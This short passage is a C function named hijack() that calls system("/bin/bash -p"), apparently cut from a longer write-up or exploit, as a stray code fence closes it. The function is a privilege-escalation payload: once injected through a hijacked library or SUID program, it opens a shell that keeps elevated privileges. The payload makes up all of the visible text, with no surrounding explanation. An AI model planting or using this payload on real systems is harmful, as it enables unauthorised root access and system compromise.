void hijack() {
        system("/bin/bash -p");
}
```